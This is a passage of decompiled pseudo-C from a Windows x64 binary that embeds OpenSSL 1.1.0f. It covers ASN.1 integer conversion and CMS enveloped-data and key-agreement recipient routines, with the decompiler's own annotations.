// 14007DBDD: variable 'v3' is possibly undefined

//----- (000000014007DC30) ----------------------------------------------------
__int64 __fastcall sub_14007DC30(__int64 *a1, int *a2, int a3)
{
  int v3; // eax
  int v6; // ecx

  if ( a2 )
  {
    v6 = a2[1];
    if ( (v6 & 0xFFFFFEFF) == a3 )
    {
      if ( (v6 & 0x100) != 0 )
      {
        sub_140024610(13, 230, 226, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 365);
        return 0i64;
      }
      else
      {
        return sub_14007DBB0(a1, *((_QWORD *)a2 + 1), *a2);
      }
    }
    else
    {
      sub_140024610(13, 230, 225, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 361);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(v3 - 43, 230, v3 + 11, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 357);
    return 0i64;
  }
}
// 14007DC5D: variable 'v3' is possibly undefined

//----- (000000014007DCF0) ----------------------------------------------------
__int64 __fastcall sub_14007DCF0(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // rax
  unsigned __int64 v4; // rdx
  unsigned int v5; // r8d
  char v7[8]; // [rsp+20h] [rbp-18h] BYREF

  *(_DWORD *)(a1 + 4) = a3;
  v3 = 8i64;
  if ( a2 >= 0 )
  {
    do
    {
      v7[--v3] = a2;
      a2 = (unsigned __int64)a2 >> 8;
    }
    while ( a2 );
    v5 = a3 & 0xFFFFFEFF;
  }
  else
  {
    v4 = -a2;
    do
    {
      v7[--v3] = v4;
      v4 >>= 8;
    }
    while ( v4 );
    v5 = a3 | 0x100;
  }
  *(_DWORD *)(a1 + 4) = v5;
  return sub_1400475D0(a1, &v7[v3], 8 - (int)v3);
}
// 14007DCF0: using guessed type char var_18[8];

//----- (000000014007DD90) ----------------------------------------------------
__int64 __fastcall sub_14007DD90(__int64 a1, __int64 a2, int a3)
{
  __int64 v5; // rax
  __int64 v6; // rbx

  if ( (*(_DWORD *)(a1 + 4) & 0xFFFFFEFF) == a3 )
  {
    v5 = sub_140026840(*(_BYTE **)(a1 + 8), *(_DWORD *)a1, a2);
    v6 = v5;
    if ( v5 )
    {
      if ( (*(_DWORD *)(a1 + 4) & 0x100) != 0 )
        sub_140027540(v5, 1);
      return v6;
    }
    else
    {
      sub_140024610(13, 228, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 505);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(13, 228, 225, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 499);
    return 0i64;
  }
}

//----- (000000014007DE50) ----------------------------------------------------
_DWORD *__fastcall sub_14007DE50(__int64 a1, _DWORD *a2, int a3)
{
  _DWORD *v5; // rbx
  int v6; // ebp

  if ( a2 )
  {
    v5 = a2;
    a2[1] = a3;
  }
  else
  {
    v5 = sub_140047720(a3);
  }
  if ( !v5 )
  {
    sub_140024610(13, 229, 58, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 463);
LABEL_13:
    if ( v5 != a2 )
      sub_14004FD70((__int64)v5);
    return 0i64;
  }
  if ( sub_1400270E0(a1) && !sub_140027160(a1) )
    v5[1] |= 0x102u;
  v6 = (int)(sub_140027260(a1) + 7) / 8;
  if ( !v6 )
    v6 = 1;
  if ( !(unsigned int)sub_1400475D0((__int64)v5, 0i64, v6) )
  {
    sub_140024610(13, 229, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 476);
    goto LABEL_13;
  }
  if ( sub_140027160(a1) )
    **((_BYTE **)v5 + 1) = 0;
  else
    v6 = sub_1400269C0(a1, *((_BYTE **)v5 + 1));
  *v5 = v6;
  return v5;
}

//----- (000000014007DF60) ----------------------------------------------------
__int64 __fastcall sub_14007DF60(__int64 *a1, char **a2, int a3)
{
  int v3; // eax
  unsigned __int64 v4; // rsi
  char *v6; // r8
  char v9; // al
  int v10; // edi
  __int64 v11; // rbx
  _DWORD *v12; // rax
  int v13; // edx
  unsigned __int64 v14; // rdi
  int v15; // ecx
  int v16; // eax
  int v17; // [rsp+60h] [rbp+18h] BYREF

  v4 = a3;
  v6 = *a2;
  if ( !v4 )
  {
    sub_140024610(v3 - 35, 226, 222, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 154);
    return 0i64;
  }
  v9 = *v6;
  if ( v4 == 1 )
  {
    v10 = 1;
    goto LABEL_5;
  }
  v13 = 0;
  if ( v9 )
  {
    if ( v9 != -1 )
      goto LABEL_22;
    v14 = 1i64;
    v15 = 0;
    do
    {
      v16 = (unsigned __int8)v6[v14++];
      v15 |= v16;
    }
    while ( v14 < v4 );
    LOBYTE(v13) = v15 != 0;
    if ( !v13 )
      goto LABEL_22;
  }
  else
  {
    v13 = 1;
  }
  if ( (*v6 & 0x80) == (v6[1] & 0x80) )
  {
    sub_140024610(13, 226, 221, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 187);
    return 0i64;
  }
LABEL_22:
  v10 = v4 - v13;
  if ( v4 == v13 )
    return 0i64;
LABEL_5:
  if ( !a1 || (v11 = *a1) == 0 )
  {
    v12 = sub_14004FE60();
    v11 = (__int64)v12;
    if ( !v12 )
      return 0i64;
    v12[1] = 2;
  }
  if ( !(unsigned int)sub_1400475D0(v11, 0i64, v10) )
  {
    sub_140024610(13, 194, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 313);
    if ( !a1 || *a1 != v11 )
      sub_14004FD70(v11);
    return 0i64;
  }
  sub_14007E120(*(_BYTE **)(v11 + 8), &v17, *a2, v4);
  if ( v17 )
    *(_DWORD *)(v11 + 4) |= 0x100u;
  *a2 += v4;
  if ( a1 )
    *a1 = v11;
  return v11;
}
// 14007E05F: conditional instruction was optimized away because rsi.8 is in (2..7FFFFFFF|>=FFFFFFFF80000000u)
// 14007DF9C: variable 'v3' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014007E120) ----------------------------------------------------
__int64 __fastcall sub_14007E120(_BYTE *a1, int *a2, char *a3, unsigned __int64 a4)
{
  int v4; // eax
  int v9; // r9d
  char v10; // al
  char v11; // al
  unsigned int v12; // r8d
  unsigned __int64 v13; // rcx
  int i; // edx
  int v15; // eax
  unsigned __int64 v16; // r10
  bool v17; // cf
  char *v18; // r9
  int v19; // edx
  unsigned __int64 v20; // r8
  int v21; // eax
  unsigned int v22; // edx

  if ( !a4 )
  {
    sub_140024610(v4 - 35, 226, 222, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 154);
    return 0i64;
  }
  v9 = *a3 & 0x80;
  if ( a2 )
    *a2 = v9;
  if ( a4 == 1 )
  {
    if ( a1 )
    {
      v10 = *a3;
      if ( v9 )
        v10 = -v10;
      *a1 = v10;
    }
    return 1i64;
  }
  v11 = *a3;
  v12 = 0;
  if ( !v11 )
  {
    v12 = 1;
    goto LABEL_17;
  }
  if ( v11 == -1 )
  {
    v13 = 1i64;
    for ( i = 0; v13 < a4; i |= v15 )
      v15 = (unsigned __int8)a3[v13++];
    LOBYTE(v12) = i != 0;
    if ( v12 )
    {
LABEL_17:
      if ( v9 == (a3[1] & 0x80) )
      {
        sub_140024610(13, 226, 221, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 187);
        return 0i64;
      }
    }
  }
  v16 = a4 - v12;
  if ( a1 )
  {
    v17 = v9 != 0;
    v18 = &a3[v12 + v16];
    v19 = v17;
    if ( v16 )
    {
      v20 = v16;
      do
      {
        v21 = (unsigned __int8)*--v18;
        --v20;
        v22 = (v21 ^ (unsigned __int8)-v17) + v19;
        a1[v20] = v22;
        v19 = v22 >> 8;
      }
      while ( v20 );
    }
  }
  return v16;
}
// 14007E151: variable 'v4' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014007E280) ----------------------------------------------------
__int64 __fastcall sub_14007E280(unsigned __int8 **a1, unsigned __int8 **a2)
{
  return sub_14007E2B0(a1[1], *(int *)a1, *((_DWORD *)a1 + 1) & 0x100, a2);
}

//----- (000000014007E2B0) ----------------------------------------------------
__int64 __fastcall sub_14007E2B0(unsigned __int8 *a1, unsigned __int64 a2, int a3, unsigned __int8 **a4)
{
  unsigned int v4; // r10d
  unsigned __int8 v5; // r11
  unsigned __int64 v8; // rax
  __int64 result; // rax
  unsigned __int64 i; // rax
  int v11; // ecx
  unsigned __int8 *v12; // rcx
  int v13; // r8d
  __int64 v14; // rsi
  unsigned __int8 *v15; // r10
  unsigned __int64 v16; // r9
  int v17; // edx
  unsigned int v18; // r8d

  v4 = 0;
  v5 = 0;
  if ( !a1 || !a2 )
  {
    result = 1i64;
    a2 = 0i64;
    goto LABEL_14;
  }
  v8 = *a1;
  if ( a3 )
  {
    v5 = -1;
    if ( v8 > 0x80 )
    {
      v4 = 1;
      result = a2 + 1;
      goto LABEL_14;
    }
    if ( v8 == 128 )
    {
      for ( i = 1i64; i < a2; v4 |= v11 )
        v11 = a1[i++];
      v5 = -(v4 != 0);
      v4 = v5 & 1;
    }
LABEL_12:
    result = a2 + v4;
    goto LABEL_14;
  }
  if ( v8 <= 0x7F )
    goto LABEL_12;
  v4 = 1;
  result = a2 + 1;
LABEL_14:
  if ( a4 )
  {
    v12 = *a4;
    if ( *a4 )
    {
      v13 = v5 & 1;
      v14 = v4;
      v15 = &a1[a2];
      *v12 = v5;
      if ( a2 )
      {
        v16 = a2;
        do
        {
          v17 = *--v15;
          --v16;
          v18 = (v5 ^ v17) + v13;
          v12[v14 + v16] = v18;
          v13 = v18 >> 8;
        }
        while ( v16 );
      }
      *a4 += result;
    }
  }
  return result;
}

//----- (000000014007E3C0) ----------------------------------------------------
void *sub_14007E3C0()
{
  return &unk_14010F500;
}

//----- (000000014007E3D0) ----------------------------------------------------
__int64 __fastcall sub_14007E3D0(int a1, __int64 *a2)
{
  __int64 v3; // rax
  __int64 result; // rax

  if ( a1 )
  {
    if ( a1 == 2 )
    {
      sub_14002D310(*a2);
      result = 2i64;
      *a2 = 0i64;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    v3 = sub_14002D430();
    *a2 = v3;
    return v3 != 0 ? 2 : 0;
  }
  return result;
}

//----- (000000014007E430) ----------------------------------------------------
__int64 __fastcall sub_14007E430(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_14010F490);
}

//----- (000000014007E450) ----------------------------------------------------
__int64 __fastcall sub_14007E450(__int64 *a1, char **a2, unsigned int a3)
{
  __int64 v6; // rbx
  __int64 v7; // rdi
  __int64 v9; // rax

  v6 = sub_14002D430();
  if ( !v6 )
    return 0i64;
  v7 = sub_1400516D0(0i64, a2, a3, (__int64)&unk_14010F5D0);
  if ( !v7 )
  {
    sub_14002D310(v6);
    return 0i64;
  }
  if ( a1 )
  {
    sub_14002D310(*a1);
    *a1 = v6;
  }
  *(_QWORD *)(v6 + 8) = *(_QWORD *)v7;
  *(_QWORD *)(v6 + 64) = *(_QWORD *)(v7 + 8);
  *(_QWORD *)(v6 + 16) = *(_QWORD *)(v7 + 16);
  *(_QWORD *)(v6 + 72) = *(_QWORD *)(v7 + 24);
  v9 = *(_QWORD *)(v7 + 32);
  if ( v9 )
  {
    *(_QWORD *)(v6 + 80) = *(_QWORD *)(*(_QWORD *)v9 + 8i64);
    *(_DWORD *)(v6 + 88) = ***(_DWORD ***)(v7 + 32);
    *(_QWORD *)(v6 + 96) = *(_QWORD *)(*(_QWORD *)(v7 + 32) + 8i64);
    *(_QWORD *)(**(_QWORD **)(v7 + 32) + 8i64) = 0i64;
    sub_14004FD70(**(_QWORD **)(v7 + 32));
    sub_14001D930(*(void **)(v7 + 32));
    *(_QWORD *)(v7 + 32) = 0i64;
  }
  sub_14001D930((void *)v7);
  return v6;
}

//----- (000000014007E570) ----------------------------------------------------
__int64 __fastcall sub_14007E570(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_14010F490);
}

//----- (000000014007E590) ----------------------------------------------------
__int64 __fastcall sub_14007E590(__int64 a1, unsigned __int8 **a2)
{
  __int64 v3; // r8
  int v4; // edx
  __int64 v6[2]; // [rsp+20h] [rbp-58h] BYREF
  int v7; // [rsp+30h] [rbp-48h] BYREF
  __int64 v8; // [rsp+38h] [rbp-40h]
  int v9; // [rsp+40h] [rbp-38h]
  __int64 v10[4]; // [rsp+48h] [rbp-30h] BYREF
  __int64 *v11; // [rsp+68h] [rbp-10h]

  v3 = *(_QWORD *)(a1 + 96);
  v10[0] = *(_QWORD *)(a1 + 8);
  v10[2] = *(_QWORD *)(a1 + 16);
  v10[1] = *(_QWORD *)(a1 + 64);
  v10[3] = *(_QWORD *)(a1 + 72);
  if ( v3 && *(_QWORD *)(a1 + 80) && (v4 = *(_DWORD *)(a1 + 88), v4 > 0) )
  {
    v8 = *(_QWORD *)(a1 + 80);
    v6[0] = (__int64)&v7;
    v11 = v6;
    v9 = 8;
    v7 = v4;
    v6[1] = v3;
  }
  else
  {
    v11 = 0i64;
  }
  return sub_1400536F0((unsigned int *)v10, a2, (__int64)&unk_14010F5D0);
}

//----- (000000014007E630) ----------------------------------------------------
__int64 *__fastcall sub_14007E630(__int64 a1, _DWORD *a2)
{
  int v2; // eax

  switch ( *a2 )
  {
    case 0:
      return sub_14007E9D0(a1, (__int64)a2);
    case 1:
      return (__int64 *)sub_14007EFA0(a1, (__int64)a2);
    case 2:
      return (__int64 *)sub_14007E870(a1, (__int64)a2);
    case 3:
      return (__int64 *)sub_1400B2EF0(a1, (__int64)a2, 1);
  }
  sub_140024610(v2 - 10, v2 + 113, v2 + 98, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 774);
  return 0i64;
}
// 14007E669: variable 'v2' is possibly undefined

//----- (000000014007E6B0) ----------------------------------------------------
__int64 __fastcall sub_14007E6B0(__int64 a1)
{
  if ( !*(_DWORD *)a1 )
    return *(_QWORD *)(*(_QWORD *)(a1 + 8) + 48i64);
  if ( *(_DWORD *)a1 == 1 )
    return *(_QWORD *)(*(_QWORD *)(a1 + 8) + 40i64);
  return 0i64;
}

//----- (000000014007E6D0) ----------------------------------------------------
__int64 __fastcall sub_14007E6D0(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4)
{
  int v4; // eax
  _QWORD *v6; // rcx

  if ( *(_DWORD *)a1 )
  {
    sub_140024610(v4 - 10, v4 + 86, v4 + 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 238);
    return 0i64;
  }
  else
  {
    v6 = *(_QWORD **)(a1 + 8);
    if ( a2 )
      *a2 = v6[5];
    if ( a3 )
      *a3 = v6[4];
    if ( a4 )
      *a4 = v6[2];
    return 1i64;
  }
}
// 14007E6F8: variable 'v4' is possibly undefined

//----- (000000014007E740) ----------------------------------------------------
__int64 __fastcall sub_14007E740(__int64 a1)
{
  int v2; // r15d
  _QWORD *v3; // rdi
  __int64 result; // rax
  __int64 v5; // rbp
  int v6; // ebx
  unsigned int *v7; // rsi
  _DWORD *v8; // rax
  __int64 v9; // rdx
  void *v10; // rcx

  v2 = 0;
  v3 = *(_QWORD **)(*(_QWORD *)(a1 + 8) + 24i64);
  result = sub_1400B2AA0((__int64)v3);
  v5 = result;
  if ( result && v3[3] )
  {
    v6 = 0;
    v7 = *(unsigned int **)(*(_QWORD *)(a1 + 8) + 16i64);
    if ( (int)sub_1400296E0(v7) <= 0 )
    {
LABEL_6:
      sub_14007ED50(*(_QWORD *)(a1 + 8));
      v2 = 1;
    }
    else
    {
      while ( 1 )
      {
        v8 = (_DWORD *)sub_140029880((__int64)v7, v6);
        if ( (int)sub_14007E630(a1, v8) <= 0 )
          break;
        if ( ++v6 >= (int)sub_1400296E0(v7) )
          goto LABEL_6;
      }
      sub_140024610(46, 125, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 868);
    }
    v9 = v3[5];
    v10 = (void *)v3[4];
    v3[3] = 0i64;
    sub_14001DA40(v10, v9, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 0x36Eu);
    v3[4] = 0i64;
    v3[5] = 0i64;
    if ( v2 )
    {
      return v5;
    }
    else
    {
      sub_140029BA0(v5);
      return 0i64;
    }
  }
  return result;
}

//----- (000000014007E870) ----------------------------------------------------
__int64 __fastcall sub_14007E870(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rbx
  __int64 *v3; // rdi
  unsigned int v4; // esi
  __int64 v5; // rbp
  _DWORD *v6; // rcx
  int v8; // eax
  size_t v9; // [rsp+20h] [rbp-138h]
  int v10[64]; // [rsp+30h] [rbp-128h] BYREF

  v2 = 0i64;
  v3 = *(__int64 **)(a2 + 8);
  v4 = 0;
  v5 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 24i64);
  v6 = (_DWORD *)v3[4];
  if ( !v6 )
  {
    sub_140024610(46, 136, 130, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 627);
    return 0i64;
  }
  if ( (unsigned int)sub_1400902A0(v6, 8 * (unsigned int)v3[5], (unsigned int *)v10) )
  {
    sub_140024610(46, 136, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 633);
  }
  else
  {
    v2 = sub_14001D8E0(*(_QWORD *)(v5 + 40) + 8i64);
    if ( v2 )
    {
      LODWORD(v9) = *(_DWORD *)(v5 + 40);
      v8 = sub_1400B2A70((__int64)v10, 0i64, v2, *(const void **)(v5 + 32), v9);
      if ( v8 > 0 )
      {
        sub_1400476D0(v3[3], (__int64)v2, v8);
        v4 = 1;
        goto LABEL_11;
      }
      sub_140024610(46, 136, 159, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 647);
    }
    else
    {
      sub_140024610(46, 136, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 640);
    }
  }
  sub_14001D930(v2);
LABEL_11:
  sub_140023440((__int64)v10, 244i64);
  return v4;
}
// 14007E942: variable 'v9' is possibly undefined

//----- (000000014007E9D0) ----------------------------------------------------
__int64 *__fastcall sub_14007E9D0(__int64 a1, __int64 a2)
{
  int v2; // eax
  void *v3; // rdi
  unsigned int v4; // r15d
  __int64 *result; // rax
  __int64 *v7; // rbp
  __int64 v8; // r14
  __int64 *v9; // rbx
  size_t v10; // [rsp+58h] [rbp+10h] BYREF

  v3 = 0i64;
  v4 = 0;
  if ( *(_DWORD *)a2 )
  {
    sub_140024610(v2 - 2, v2 + 93, v2 + 76, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 303);
    return 0i64;
  }
  v7 = *(__int64 **)(a2 + 8);
  v8 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 24i64);
  v9 = (__int64 *)v7[6];
  if ( v9 )
  {
    if ( (unsigned int)sub_14007EBA0(a2, 0) )
    {
LABEL_8:
      if ( (int)sub_140020440(v9, -1, 256, 9u, 0, a2) > 0 )
      {
        if ( (int)sub_140020E90(v9, 0i64, &v10, *(_QWORD *)(v8 + 32), *(_QWORD *)(v8 + 40)) > 0 )
        {
          v3 = sub_14001D8E0(v10);
          if ( v3 )
          {
            if ( (int)sub_140020E90(v9, (__int64)v3, &v10, *(_QWORD *)(v8 + 32), *(_QWORD *)(v8 + 40)) > 0 )
            {
              sub_1400476D0(v7[3], (__int64)v3, v10);
              v3 = 0i64;
              v4 = 1;
            }
          }
          else
          {
            sub_140024610(46, 141, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 335);
          }
        }
      }
      else
      {
        sub_140024610(46, 141, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 325);
      }
    }
  }
  else
  {
    result = sub_140020770(v7[5], 0i64);
    v9 = result;
    if ( !result )
      return result;
    if ( (int)sub_140020FE0(result) > 0 )
      goto LABEL_8;
  }
  sub_140020670(v9);
  v7[6] = 0i64;
  sub_14001D930(v3);
  return (__int64 *)v4;
}
// 14007EA00: variable 'v2' is possibly undefined

//----- (000000014007EBA0) ----------------------------------------------------
__int64 __fastcall sub_14007EBA0(__int64 a1, unsigned int a2)
{
  __int64 jumpbuf_sp; // rax
  __int64 v5; // rcx
  __int64 v6; // rcx
  __int64 (__fastcall *v7)(__int64, __int64, _QWORD, __int64); // r10
  int v8; // eax

  if ( *(_DWORD *)a1 )
  {
    if ( *(_DWORD *)a1 != 1 )
      return 0i64;
    v5 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 40i64);
    if ( !v5 )
      return 0i64;
    jumpbuf_sp = _except_get_jumpbuf_sp(v5);
    if ( !jumpbuf_sp )
      return 0i64;
  }
  else
  {
    jumpbuf_sp = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 40i64);
  }
  v6 = *(_QWORD *)(jumpbuf_sp + 16);
  if ( !v6 )
    return 1i64;
  v7 = *(__int64 (__fastcall **)(__int64, __int64, _QWORD, __int64))(v6 + 176);
  if ( !v7 )
    return 1i64;
  v8 = v7(jumpbuf_sp, 7i64, a2, a1);
  if ( v8 == -2 )
  {
    sub_140024610(46, 171, 125, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 71);
    return 0i64;
  }
  if ( v8 > 0 )
    return 1i64;
  sub_140024610(46, 171, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_env.c", 75);
  return 0i64;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (000000014007EC90) ----------------------------------------------------
void __fastcall sub_14007EC90(__int64 a1)
{
  __int64 v1; // rbx
  int v3; // edi
  int v4; // ebp
  int v5; // ecx

  v1 = *(_QWORD *)(a1 + 8);
  if ( v1 )
  {
    v3 = 0;
    v4 = 0;
    if ( (int)sub_1400296E0(*(unsigned int **)v1) <= 0 )
    {
LABEL_8:
      if ( (int)sub_1400296E0(*(unsigned int **)(v1 + 8)) <= 0 )
        return;
      while ( *(_DWORD *)sub_140029880(*(_QWORD *)(v1 + 8), v3) != 1 )
      {
        if ( ++v3 >= (int)sub_1400296E0(*(unsigned int **)(v1 + 8)) )
          return;
      }
    }
    else
    {
      while ( 1 )
      {
        v5 = *(_DWORD *)sub_140029880(*(_QWORD *)v1, v4);
        if ( v5 == 4 )
          break;
        if ( v5 == 3 && *(int *)a1 < 3 )
          *(_DWORD *)a1 = 3;
        if ( ++v4 >= (int)sub_1400296E0(*(unsigned int **)v1) )
          goto LABEL_8;
      }
    }
    *(_DWORD *)a1 = 4;
  }
}

//----- (000000014007ED50) ----------------------------------------------------
void __fastcall sub_14007ED50(__int64 a1)
{
  int v2; // edi
  __int64 v3; // rax

  if ( *(int *)a1 < 4 )
  {
    sub_14007EC90(a1);
    if ( *(int *)a1 < 3 )
    {
      v2 = 0;
      if ( (int)sub_1400296E0(*(unsigned int **)(a1 + 16)) <= 0 )
      {
LABEL_9:
        if ( *(_QWORD *)(a1 + 8) || *(_QWORD *)(a1 + 32) )
        {
          *(_DWORD *)a1 = 2;
        }
        else if ( *(_DWORD *)a1 != 2 )
        {
          *(_DWORD *)a1 = 0;
        }
      }
      else
      {
        while ( 1 )
        {
          v3 = sub_140029880(*(_QWORD *)(a1 + 16), v2);
          if ( (unsigned int)(*(_DWORD *)v3 - 3) <= 1 )
            break;
          if ( *(_DWORD *)v3 || **(_DWORD **)(v3 + 8) )
            *(_DWORD *)a1 = 2;
          if ( ++v2 >= (int)sub_1400296E0(*(unsigned int **)(a1 + 16)) )
            goto LABEL_9;
        }
        *(_DWORD *)a1 = 3;
      }
    }
  }
}

//----- (000000014007EE10) ----------------------------------------------------
__int64 __fastcall sub_14007EE10(__int64 a1, _QWORD *a2, _QWORD *a3)
{
  int v3; // eax

  if ( *(_DWORD *)a1 == 1 )
  {
    if ( a2 )
      *a2 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 24i64);
    if ( a3 )
      *a3 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 16i64);
    return 1i64;
  }
  else
  {
    sub_140024610(v3 - 10, v3 + 119, v3 + 125, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_kari.c", 28);
    return 0i64;
  }
}
// 14007EE37: variable 'v3' is possibly undefined

//----- (000000014007EE80) ----------------------------------------------------
__int64 __fastcall sub_14007EE80(__int64 a1)
{
  if ( *(_DWORD *)a1 == 1 )
    return *(_QWORD *)(*(_QWORD *)(a1 + 8) + 48i64);
  else
    return 0i64;
}

//----- (000000014007EEA0) ----------------------------------------------------
__int64 __fastcall sub_14007EEA0(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, _QWORD *a5, _QWORD *a6)
{
  int v6; // eax
  __int64 result; // rax
  int *v9; // rdx
  int v10; // eax

  if ( *(_DWORD *)a1 != 1 )
  {
    sub_140024610(v6 - 2, v6 + 125, v6 + 133, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_kari.c", 61);
    return 0i64;
  }
  v9 = *(int **)(*(_QWORD *)(a1 + 8) + 8i64);
  if ( a5 )
    *a5 = 0i64;
  if ( a6 )
    *a6 = 0i64;
  if ( a4 )
    *a4 = 0i64;
  if ( a2 )
    *a2 = 0i64;
  if ( a3 )
    *a3 = 0i64;
  v10 = *v9;
  if ( *v9 )
  {
    if ( v10 == 1 )
    {
      if ( a4 )
      {
        *a4 = *((_QWORD *)v9 + 1);
        return 1i64;
      }
    }
    else
    {
      if ( v10 != 2 )
        return 0i64;
      if ( a2 )
        *a2 = **((_QWORD **)v9 + 1);
      if ( a3 )
        *a3 = *(_QWORD *)(*((_QWORD *)v9 + 1) + 8i64);
    }
  }
  else
  {
    if ( a5 )
      *a5 = **((_QWORD **)v9 + 1);
    if ( a6 )
    {
      result = 1i64;
      *a6 = *(_QWORD *)(*((_QWORD *)v9 + 1) + 8i64);
      return result;
    }
  }
  return 1i64;
}
// 14007EED0: variable 'v6' is possibly undefined

//----- (000000014007EFA0) ----------------------------------------------------
__int64 __fastcall sub_14007EFA0(__int64 a1, __int64 a2)
{
  int v2; // eax
  __int64 result; // rax
  _QWORD *v5; // rdi
  __int64 v6; // r14
  unsigned int *v7; // rbp
  __int64 v8; // rsi
  void *v9; // rax
  __int64 v10; // rax
  int v11; // ebx
  __int64 v12; // rsi
  __int64 v13; // [rsp+58h] [rbp+10h] BYREF
  char *v14; // [rsp+60h] [rbp+18h] BYREF

  if ( *(_DWORD *)a2 != 1 )
  {
    sub_140024610(v2 - 18, v2 + 114, v2 + 117, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_kari.c", 373);
    return 0i64;
  }
  v5 = *(_QWORD **)(a2 + 8);
  v6 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 24i64);
  v7 = (unsigned int *)v5[4];
  result = sub_14007F270((__int64)v5, *(unsigned int **)(v6 + 24));
  if ( (_DWORD)result )
  {
    v8 = v5[1];
    if ( *(_DWORD *)v8 == -1 )
    {
      *(_DWORD *)v8 = 2;
      v9 = sub_1400807E0();
      v10 = sub_140050B70((__int64)v9);
      *(_QWORD *)(v8 + 8) = v10;
      if ( !v10 )
        return 0i64;
    }
    if ( !(unsigned int)sub_14007EBA0(a2, 0) )
      return 0i64;
    v11 = 0;
    if ( (int)sub_1400296E0(v7) > 0 )
    {
      while ( 1 )
      {
        v12 = sub_140029880((__int64)v7, v11);
        if ( (int)sub_140020C80(v5[5], *(_DWORD **)(v12 + 16)) <= 0
          || !(unsigned int)sub_14007F0F0(&v14, &v13, *(char **)(v6 + 32), *(_QWORD *)(v6 + 40), (__int64)v5, 1) )
        {
          break;
        }
        sub_1400476D0(*(_QWORD *)(v12 + 8), (__int64)v14, v13);
        if ( ++v11 >= (int)sub_1400296E0(v7) )
          return 1i64;
      }
      return 0i64;
    }
    return 1i64;
  }
  return result;
}
// 14007EFC9: variable 'v2' is possibly undefined

//----- (000000014007F0F0) ----------------------------------------------------
__int64 __fastcall sub_14007F0F0(char **a1, _QWORD *a2, char *a3, int a4, __int64 a5, int a6)
{
  unsigned int v10; // esi
  char *v11; // rdi
  __int64 result; // rax
  char *v13; // rax
  __int64 v14; // rax
  int v15; // [rsp+30h] [rbp-98h] BYREF
  unsigned __int64 v16; // [rsp+38h] [rbp-90h] BYREF
  int v17[16]; // [rsp+40h] [rbp-88h] BYREF

  v10 = 0;
  v11 = 0i64;
  v16 = (int)sub_140024D30(*(_QWORD *)(a5 + 48));
  if ( v16 > 0x40 )
    return 0i64;
  if ( (int)sub_140020A70(*(__int64 **)(a5 + 40), (__int64)v17, &v16) > 0 )
  {
    if ( (unsigned int)sub_14001B7A0(*(_DWORD **)(a5 + 48), 0i64, 0i64, (__int64)v17, 0i64, a6) )
    {
      if ( (unsigned int)sub_14001BAD0(*(int **)(a5 + 48), 0i64, &v15, a3, a4) )
      {
        v13 = (char *)sub_14001D8E0(v15);
        v11 = v13;
        if ( v13 )
        {
          if ( (unsigned int)sub_14001BAD0(*(int **)(a5 + 48), v13, &v15, a3, a4) )
          {
            v14 = v15;
            v10 = 1;
            *a1 = v11;
            *a2 = v14;
          }
        }
      }
    }
  }
  sub_140023440((__int64)v17, v16);
  if ( !v10 )
    sub_14001D930(v11);
  sub_14001B600(*(_QWORD *)(a5 + 48));
  sub_140020670(*(_QWORD **)(a5 + 40));
  result = v10;
